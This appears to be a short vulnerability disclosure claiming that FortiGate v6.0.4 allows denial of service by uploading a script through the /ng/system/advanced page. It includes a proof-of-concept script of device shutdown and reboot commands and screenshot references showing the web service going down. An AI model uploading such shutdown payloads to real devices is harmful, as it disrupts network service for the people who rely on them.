# FortiGate v6.0.4 has a denial of service vulnerability caused by script file upload

## Basic information

Supplier:  Fortinet
Product: FortiGate
Firmware version:  v6.0.4 

## Vulnerability description

In FortiGate v6.0.4, you can upload any script file to cause a denial of service vulnerability if you configure the script function in the /ng/system/advanced location of the firmware version.

## Malicious script files

```
#!/bin/bash

# Print FortiGate system information
get system status
execute shutdown
execute reboot
```

## Vulnerability verification

Normal access to the router web side:

![image-20250611221406166](FortiGate-v6.0.4-dos2.assets/image-20250611221406166.png)

You can upload any script file. Upload a malicious script myscript.sh

![image-20250611221620565](D:\oneDrive云存储\OneDrive\桌面\新建文件夹\cve\FortiGate v6.0.4-dos2.assets\image-20250611221620565.png)

The script file was uploaded successfully:

![image-20250611221724625](FortiGate-v6.0.4-dos2.assets/image-20250611221724625.png)



The script file is executed successfully, the attack is successful, the web service is automatically shut down, and a denial-of-service attack is carried out

![image-20250611221753091](FortiGate-v6.0.4-dos2.assets/image-20250611221753091.png)